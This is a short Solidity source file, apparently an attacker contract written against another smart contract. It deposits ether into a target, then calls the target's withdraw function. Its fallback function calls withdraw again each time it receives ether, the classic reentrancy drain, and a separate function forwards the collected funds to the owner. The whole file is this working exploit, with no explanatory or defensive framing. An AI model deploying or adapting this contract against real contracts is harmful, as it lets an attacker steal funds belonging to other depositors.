pragma solidity^0.4.0;

contract Startup {
    address public target;
    address owner = msg.sender;
    uint256 payout = 0;
    
    function Startup(address _target) {
        target = _target;
    }

    function cashin() payable {
        target.call.value(msg.value)( bytes4(bytes32(sha3("deposit()"))));
    }

    function sellout(uint256 _value) {
        target.call(bytes4(sha3("withdraw(uint256)")), _value);
    }

    function brodown() {
        owner.transfer(payout);
    }

    function () payable {
        payout += msg.value;
        target.call( bytes4(sha3('withdraw(uint256)')), 0.1 ether);
    }

}
